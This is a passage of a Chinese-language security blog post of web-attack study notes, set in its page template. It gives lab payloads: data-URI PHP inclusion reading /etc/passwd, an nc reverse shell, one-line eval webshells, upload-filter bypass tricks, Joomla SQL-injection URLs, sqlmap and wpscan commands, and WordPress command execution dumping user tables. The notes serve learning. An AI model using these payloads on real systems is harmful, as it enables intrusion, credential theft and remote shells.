          <li>Enable Post Data: &lt;?system(“/sbin/ifconfig”)?&gt;/&lt;?system(“uname -a”)?&gt;</li>
          <li>使用伪协议直接用get方式:http://172.16.1.227/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain,&lt;?php system(“id”);?&gt;%00</li>
          <li>把php指令经过base64编码和url编码，替换原来的</li>
          <li>http://172.16.1.227/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9wYXNzd2QnKTs%2fPg%3D%3D%00</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<h5 id="25-命令注入漏洞攻击remote-command-execution-rce"><span class="mr-2">2.5 命令注入漏洞攻击(Remote Command Execution, RCE)</span><a href="#25-命令注入漏洞攻击remote-command-execution-rce" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5>
<ul>
  <li>服务器通过脚本代码在 执行命令的时候过滤不严，从而注入一段攻击者能够 控制的代码，从而在服务器上以Web服务的后台权限 远程执行恶意指令。</li>
  <li>nslookup 加分号再加别的命令可以获取linux信息。
    <ul>
      <li>一般可以实现读写的文件
        <ul>
          <li>/tmp</li>
          <li>/sbin/ifconfig</li>
          <li>/etc/passwd</li>
          <li>/var/www</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>nc监听，连接反弹shell
    <ul>
      <li>nc 172.16.185.167 -nlp 443</li>
      <li>nc 172.16.185.167 443 -e /bin/sh</li>
      <li>dirtycow提权</li>
    </ul>
  </li>
  <li>dvwa
    <ul>
      <li>user/user</li>
      <li>源码位置： /var/www/dvwa/vulnerabilities/exec/source/</li>
      <li>`shell_command` 执行shell_command命令</li>
      <li>$(shell_command) 执行shell_command命令</li>
      <li><code class="language-plaintext highlighter-rouge">| shell_command</code> 执行shell_command命令并返回结果</li>
      <li><code class="language-plaintext highlighter-rouge">|| shell_command</code> 执行shell_command命令并返回结果</li>
      <li>; shell_command 执行shell_command命令并返回结果</li>
      <li>&amp;&amp; shell_command 执行shell_command命令并返回结果</li>
      <li><code class="language-plaintext highlighter-rouge">&gt; target_file</code> 返回结果覆盖到target_file里</li>
      <li><code class="language-plaintext highlighter-rouge">&gt;&gt; target_file</code> 返回结果追加到target_file里</li>
      <li><code class="language-plaintext highlighter-rouge">&lt; target_file</code> 把target_file的内容输入到之前的命令当中</li>
      <li>
        <ul>
          <li>operator 给目标指令添加额外的参数</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<h5 id="26-文件上传漏洞攻击"><span class="mr-2">2.6 文件上传漏洞攻击</span><a href="#26-文件上传漏洞攻击" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5>
<ul>
  <li>Webshell
    <ul>
      <li>大马/小马</li>
      <li>权限问题和功能问题</li>
      <li>kali：weevely</li>
    </ul>
  </li>
  <li>小马
    <ul>
      <li>CKnife</li>
      <li>蚁建</li>
      <li>altman</li>
    </ul>
  </li>
  <li>CKnife
    <ul>
      <li>ctrl+l 文件管理器输入地址</li>
      <li>解压ckinfe，到路径下，</li>
      <li>java -jar Cknife.jar运行ckinfe</li>
      <li><code class="language-plaintext highlighter-rouge">@eval(_$POST('cmd'));</code>一句话木马</li>
      <li>hackbar中postdata中输入cmd= echo hello;</li>
      <li>第一题
        <ul>
          <li>上传文件过程中，当需要检验文件格式时，若是前端检验，可以修改审查元素</li>
          <li>还可以修改文件格式，使用burpsuite抓包，在浏览器中使用本地代理，修改包的内容，改文件名</li>
          <li>之后使用Ckinfe获取服务器结构</li>
        </ul>
      </li>
      <li>第二题(MIME类型验证)
        <ul>
          <li>在burpsuite里修改文件类型为image/jpeg,然后就能避开检验</li>
          <li>image/jpeg</li>
        </ul>
      </li>
      <li>第三题（文件扩展名的黑名单验证）
        <ul>
          <li>strchr找第一个符合条件</li>
          <li>strrchr找最后一个符合条件</li>
          <li>修改可以上传文件的后缀为php3，php4，php5</li>
        </ul>
      </li>
      <li>第四题 文件内容格式验证
        <ul>
          <li>getimagesize($file_name);通过文件头部获得文件大小</li>
          <li>在木马中加入GIF89a即可绕过检测，被服务器判断是gif文件</li>
          <li>总结：改成合法类型、改成php3、改成合法的文件头</li>
        </ul>
      </li>
      <li>第五题 文件拓展名白名单验证–子目录劫持
        <ul>
          <li>篡改子目录upload/yyy.php%00/xxx.jpg	 	* 在burpsuite中修改image改成tiny.php，再把proxy-hex中找到并把php之后的一个字节改为00。</li>
        </ul>
      </li>
      <li>
        <p>文件上传漏洞攻击</p>
      </li>
      <li>
        <p>提权大杀器工具，令牌攫取漏洞 pr</p>

        <ul>
          <li>神器：熟练掌握sqlmap,nmap,burpsuite,metaspolit,setoolkit</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<h5 id="27-文件上传漏洞"><span class="mr-2">2.7 文件上传漏洞</span><a href="#27-文件上传漏洞" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5>

<p>上传文件攻击：</p>

<h6 id="iis60解析asp漏洞">IIS6.0解析ASP漏洞</h6>

<ol>
  <li>服务器上可执行文件名为.cer.cdx.asc</li>
  <li>cer证书最后加上小马<code class="language-plaintext highlighter-rouge">@eval(_$POST('cmd'));</code>实现。</li>
  <li>在文件夹名为xxx.asp目录下，里面可以实现任意拓展名的文件都会在服务器上执行。</li>
  <li>小马的文件名设置成<code class="language-plaintext highlighter-rouge">pp.asp;.jpg</code></li>
  <li>防御方法：服务器保存文件时自己定义文件名保存，不相信用户的输入</li>
</ol>

<h6 id="nginx解析php漏洞">nginx解析php漏洞</h6>

<ol>
  <li>nginx&lt;=0.8.37,用户访问xxx.jpg/xxx.php时服务器会把xxx.jpg当做PHP文件解析</li>
</ol>

<h6 id="使用网页编辑器中的漏洞">使用网页编辑器中的漏洞</h6>

<p>IIS6解析漏洞攻击</p>

<p>fckeditor/eitor/filemanager/upload
fckeditor/eitor/filemanager/browser/default/connectors/asp/connector.asp</p>

<ul>
  <li>tamperdata查看服务器版本和类型：192.168.1.222/EditNews.html</li>
  <li>查看fckeditor版本：192.168.1.222/fckeditor/_whatsnew.html</li>
  <li>http://192.168.1.222/fckeditor/editor/filemanager/browser/default/browser.html?connector=connectors/asp/connector.asp</li>
  <li>http://192.168.1.222/fckeditor/editor/filemanager/browser/default/browser.html?connector=connectors/asp/connector.asp&amp;type=Image</li>
  <li>192.168.1.222/userfiles/image/fck.asp/littlec01dstudy.jpg</li>
  <li>直接上传littlec01dstudy.asp;.jpg文件同样可以直接运行文件内容192.168.1.222/userfiles/image/littlec01dstudy.asp;.jpg</li>
  <li>或者在如下url中使用类似方法
    <ul>
      <li>192.168.1.222/fckeditor/editor/filemanager/browser/default/connectors/test.html</li>
      <li>192.168.1.222/fckeditor/editor/filemanager/upload/test.html</li>
      <li>192.168.1.222/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Com mand=GetFoldersAndFiles&amp;Type=File&amp;CurrentFolder=%2F</li>
    </ul>
  </li>
</ul>

<h5 id="28-web应用组件攻击"><span class="mr-2">2.8 Web应用组件攻击</span><a href="#28-web应用组件攻击" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5>

<p>Kali：</p>

<ul>
  <li>whatWeb</li>
</ul>

<h6 id="web应用服务和框架组件攻击">Web应用服务和框架组件攻击</h6>

<ol>
  <li>
    <p>Joomla3.2.1</p>

    <ul>
      <li>whatweb/zoomeye/shodan.io搜索相关信息</li>
      <li>在exploit-db.com找到相关漏洞
        <ul>
          <li>192.168.10.100/index.php/weblinks-categories?id=0 ) union select password from <code class="language-plaintext highlighter-rouge">nnla5_users</code> – )</li>
          <li>192.168.10.100/index.php/weblinks-categories?id=0 ) union select concat(0x5b,username,0x3a,password,0x5d) from nnla5_users limit 0,1 – )</li>
          <li>192.168.10.100/index.php/weblinks-categories?id=0%20%29%20union%20select%20password%20from%20%60nnla5_users%60%20–%20%29</li>
          <li>admin:admin123</li>
          <li>sqlmap -u ‘http://192.168.10.100/index.php/weblinks-categories?id=0<em>’ –level=3 –dbs 把注入的语句用</em>代替，使用*告知sqlmap在这里注入成功率较高
            <ul>
              <li>sqlmap：相比level1，level3是尝试更多的注入</li>
              <li>sqlmap -u ‘http://192.168.10.100/index.php/weblinks-categories?id=0*’ –level=3 –dbs</li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>
    <p>wordpress</p>

    <ul>
      <li>Kali:wpscan
        <ul>
          <li>主要使用plugin和数据库相关指令</li>
          <li>wpscan -u http://192.168.10.116/wordpress –enumerate p</li>
          <li>192.168.10.116/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain,&lt;php @eval($_POST[‘cmd’]);//	wordpress一句话木马</li>
          <li>绕过方法：<strong>RFI to get shell</strong>
            <ul>
              <li>192.168.10.116/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain,&lt;?php @eval($_POST[‘cmd’]);?&gt;</li>
              <li>data:text/plain,&lt;?php @eval($_POST[‘cmd’]);?&gt;</li>
              <li>data:text/plain,&lt;?php @eval($_POST[‘cmd’]);//</li>
              <li>发现可以执行phpinfo指令，192.168.10.116/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain,&lt;?php @eval($_GET[‘cmd’]);?&gt;&amp;cmd=phpinfo();</li>
              <li>192.168.10.116/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain,&lt;?php @eval($_GET[‘cmd’]);?&gt;&amp;cmd=passthru(‘mysql -u wordpress -pwp_pass888 -A wordpress -e “show tables;”’);</li>
              <li>192.168.10.116/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain,&lt;?php @eval($_GET[‘cmd’]);?&gt;&amp;cmd=passthru(‘mysql -u wordpress -pwp_pass888 -A wordpress -e “select * from wp_users;”’);</li>
              <li>passthru执行系统命令并且回显：-p后面不能有空格，要直接连接密码；单双引号使用分开，否则会不正常闭合</li>
            </ul>
          </li>
          <li>sqli to get shell
            <ul>
              <li>admin:wp_@dm!n</li>
            </ul>
          </li>
          <li>插件实现WordPress渗透：jetpack</li>
          <li>上传插件时加入一句话木马</li>
          <li>上传路径在/wordpress/wp-content/plugins/akismet,在该路径下实现了渗透</li>
        </ul>
      </li>
    </ul>
  </li>
</ol>

<h3 id="问题"><span class="mr-2">问题</span><a href="#问题" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<ol>
  <li>SQL注入时<code class="language-plaintext highlighter-rouge">select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;</code>
实际情况如下面的例子<code class="language-plaintext highlighter-rouge">select count(*) from TSafe group by floor(rand(0)*2);</code>
    <ul>
      <li>表中必须有3条以上的记录才会报错</li>
      <li>rand()函数的随机因子若不取，则会随机报错，设为固定值如rand(0)，如表中有3条以上数据，就一定报错。</li>
      <li>原理：
        <ul>
          <li>执行该条语句时，先建立虚表</li>
          <li>floor(rand(0)*2)的返回值是011011…且查询时rand()会被反复执行，即在查询过程中每次匹配会重新计算rand()的值</li>
          <li>011011..第一次查询0，没有重新计算为1，产生第一条数据；第二次查询1，有count则直接加1为2；第三次查询0没有重新计算为1，此时有1但是仍要插入1，重复报错。</li>
        </ul>
      </li>
    </ul>
  </li>
  <li><strong><em>[关键]</em></strong>在使用虚拟机的时候会遇到内存不足的情况，直接修改Vmware里的硬盘大小会导致虚拟机重启后无法开机。<a href="https://codesilence.wordpress.com/2013/03/14/live-resizing-of-an-ext4-filesytem-on-linux/">解决办法</a>是需要重新划分硬盘和设置交换区，使用<code class="language-plaintext highlighter-rouge">fdisk</code>和<code class="language-plaintext highlighter-rouge">mkswap</code>等工具实现。</li>
</ol>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories -->
  

  <!-- tags -->
  
  <div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i>
      
      <a href="/tags/security/"
          class="post-tag no-text-decoration" >Security</a>
      
  </div>
  

  <div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">

      

        

        This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.

      
    </div>

    <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0--Web%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%20-%20c0ldstudy&url=http%3A%2F%2Fc0ldstudy.github.io%2Fposts%2F%25E5%25AE%2589%25E5%2585%25A8%25E7%25AC%2594%25E8%25AE%25B02%2F" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0--Web%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%20-%20c0ldstudy&u=http%3A%2F%2Fc0ldstudy.github.io%2Fposts%2F%25E5%25AE%2589%25E5%2585%25A8%25E7%25AC%2594%25E8%25AE%25B02%2F" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://t.me/share/url?url=http%3A%2F%2Fc0ldstudy.github.io%2Fposts%2F%25E5%25AE%2589%25E5%2585%25A8%25E7%25AC%2594%25E8%25AE%25B02%2F&text=%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0--Web%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%20-%20c0ldstudy" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copy link"
        data-title-succeed="Link copied successfully!">
    </i>

  </span>
</div>


  </div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->


      
    
    

    </div>
  </div> <!-- #core-wrapper -->

  <!-- panel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted">

    <div class="access">
      















  <div id="access-lastmod" class="post">
    <div class="panel-heading">Recently Updated</div>
    <ul class="post-content pl-0 pb-1 ml-1 mt-2">
      
        
        
        
      <li><a href="/posts/Paper_Summary_2023/">Paper Summary 2023</a></li>
      
        
        
        
      <li><a href="/posts/Reinforcement_Learning_Course/">Reinforcement Learning Course from Hugging Face</a></li>
      
        
        
        
      <li><a href="/posts/ChatGPT_Prompt/">ChatGPT Prompt Course Note</a></li>
      
        
        
        
      <li><a href="/posts/Coding_Interview/">Coding Interview</a></li>
      
        
        
        
      <li><a href="/posts/PC_attack/">[DSN2023] On Adversarial Robustness of Point Cloud Semantic Segmentation</a></li>
      
    </ul>
  </div> <!-- #access-lastmod -->



      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/phd/">PhD</a>
    
      
      <a class="post-tag" href="/tags/security/">Security</a>
    
      
      <a class="post-tag" href="/tags/machine-learning/">Machine Learning</a>
    
      
      <a class="post-tag" href="/tags/website/">Website</a>
    
      
      <a class="post-tag" href="/tags/system/">System</a>
    
      
      <a class="post-tag" href="/tags/note/">Note</a>
    
      
      <a class="post-tag" href="/tags/ctf/">CTF</a>
    
      
      <a class="post-tag" href="/tags/conferences/">Conferences</a>
    
      
      <a class="post-tag" href="/tags/design/">Design</a>
    
      
      <a class="post-tag" href="/tags/network/">Network</a>
    

    </div>
  </div>


    </div>

    
      
      



  <div id="toc-wrapper" class="pl-0 pr-4 mb-5">
    <div class="panel-heading pl-3 pt-2 mb-2">Contents</div>
    <nav id="toc"></nav>
  </div>

  <!-- toc.js will be loaded at medium priority -->
  <script src="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.js"></script>


    
  </div>

</div>

<!-- tail -->

<div class="row">
  <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5">
    
      
      <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->





  <div id="related-posts" class="mb-2 mb-sm-4">
    <h3 class="pt-2 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/powershell_cookbook/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1492412400"
    data-df="ll"
    >
  Apr 17, 2017
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>powershell cookbook</h3>
            <div class="text-muted small">
              <p>
                





                1.使用指南

1.1运行脚本（调用操作：命令名中包含空格）

&amp;amp; &#39;C:\Program Files\Program.exe&#39; arguments
当前目录下：.\Program.exe arguments


1.3配置文件

Prompt()函数


1.4帮助

Get-Command/Get-Help


1.7命令转化为Base64编码

$commands = &#39;1.....
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1509087600"
    data-df="ll"
    >
  Oct 27, 2017
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>安全笔记概论</h3>
            <div class="text-muted small">
              <p>
                





                1 概论


  攻击流程
    
      预攻击：收集信息，进行决策
      攻击：进行攻击，获得权限，进行渗透
      后攻击：长期控守，维持权限，消除痕迹
    
  
  APT攻击（高级持续性攻击）
    
      定向信息收集：针对性收集，包括网络隐蔽扫描和社工方法
      外网攻击突破：恶意代码攻击个人终端或者单位服务器
      构建控制通道：采用...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/Metasploit/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1521356400"
    data-df="ll"
    >
  Mar 18, 2018
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Metasploit</h3>
            <div class="text-muted small">
              <p>
                





                
Metasploit渗透测试魔鬼训练营

诸葛建伟 陈力波 孙松柏 等著

1. 基础知识

1.1 Metasploit使用接口：msfgui, msfconsole, msfcli。（最新kali2018只含有msfconsole）

2. 渗透测试实验环境

深入理解

3. 情报搜集技术

3.1 注册信息查询


  whois：查询域名注册信息数据库
  nslookup：从D...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->


    
      
      <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/posts/MongoDB/" class="btn btn-outline-primary"
    prompt="Older">
    <p>MongoDB自学笔记</p>
  </a>
  

  
  <a href="/posts/emacs%E6%80%BB%E7%BB%93/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>emacs总结</p>
  </a>
  

</div>

    
      
      <!--  The comments switcher -->

  
  <!-- https://giscus.app/ -->
<script type="text/javascript">
  $(function () {
    const origin = "https://giscus.app";
    const iframe = "iframe.giscus-frame";
    const lightTheme = "light";
    const darkTheme = "dark_dimmed";
    let initTheme = lightTheme;

    if ($("html[data-mode=dark]").length > 0
        || ($("html[data-mode]").length == 0
            && window.matchMedia("(prefers-color-scheme: dark)").matches)) {
      initTheme = darkTheme;
    }

    let giscusAttributes = {
      "src": "https://giscus.app/client.js",
      "data-repo": "C0ldstudy/c0ldstudy.github.io",
      "data-repo-id": "MDEwOlJlcG9zaXRvcnkyMzgxNzM1ODU=",
      "data-category": "Announcements",
      "data-category-id": "DIC_kwDODjI9kc4CV58d",
      "data-mapping": "pathname",
      "data-reactions-enabled": "1",
      "data-emit-metadata": "0",
      "data-theme": initTheme,
      "data-input-position": "bottom",
      "data-lang": "",
      "crossorigin": "anonymous",
      "async": ""
    };

    let giscusScript = document.createElement("script");
    Object.entries(giscusAttributes).forEach(([key, value]) => giscusScript.setAttribute(key, value));
    document.getElementById("tail-wrapper").appendChild(giscusScript);

    addEventListener("message", (event) => {
      if (event.source === window && event.data &&
            event.data.direction === ModeToggle.ID) {
        /* global theme mode changed */
        const mode = event.data.message;
        const theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme);

        const message = {
          setConfig: {
            theme: theme
          }
        };

        const giscus = document.querySelector(iframe).contentWindow;
        giscus.postMessage({ giscus: message }, origin);
      }

    });

  });
</script>



    
  </div>
</div>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/phd/">PhD</a>
    
      
      <a class="post-tag" href="/tags/security/">Security</a>
    
      
      <a class="post-tag" href="/tags/machine-learning/">Machine Learning</a>
    
      
      <a class="post-tag" href="/tags/website/">Website</a>
    
      
      <a class="post-tag" href="/tags/system/">System</a>
    
      
      <a class="post-tag" href="/tags/note/">Note</a>
    
      
      <a class="post-tag" href="/tags/ctf/">CTF</a>
    
      
      <a class="post-tag" href="/tags/conferences/">Conferences</a>
    
      
      <a class="post-tag" href="/tags/design/">Design</a>
    
      
      <a class="post-tag" href="/tags/network/">Network</a>
    

    </div>
  </div>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    <!-- The Footer -->

<footer>
    <div class="container pl-lg-4 pr-lg-4">
      <div hidden>
        <div class="github_chart">
          <img src="http://ghchart.rshah.org/409ba5/C0ldstudy" alt="C0ldstudy's Blue Github chart"/>
          <script type='text/javascript' id='clustrmaps' src='//cdn.clustrmaps.com/map_v2.js?cl=ffffff&w=300&t=tt&d=PWaejm3rz2TG6HOtwcekX2kM9kPWz2aP6GYhuOVoNpA'></script>
        </div>
      </div>

        <div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3">
        <div class="footer-left">
          <p class="mb-0">
            © 2023
            <a href="https://twitter.com/JiacenXu">Jiacen (Jason) Xu</a>.
            
            <span data-toggle="tooltip" data-placement="top"
              title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
            
          </p>
        </div>

        <!-- <script  type="text/javascript" id="clustrmaps" src="//clustrmaps.com/map_v2.js?d=PWaejm3rz2TG6HOtwcekX2kM9kPWz2aP6GYhuOVoNpA&cl=ffffff&w=a"></script> -->
        <div class="footer-right">
          <p class="mb-0"><!-- Using the <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> theme <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>. -->
          </p>
        </div>
      </div>
    </div>
  </footer>


    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    
      <div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true"
        data-animation="true" data-autohide="false">
        <div class="toast-header">
          <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="toast-body text-center pt-0">
          <p class="pl-2 pr-2 mb-3">A new version of content is available.</p>
          <button type="button" class="btn btn-primary" aria-label="Update">
            Update
          </button>
        </div>
      </div>
    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No results found.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
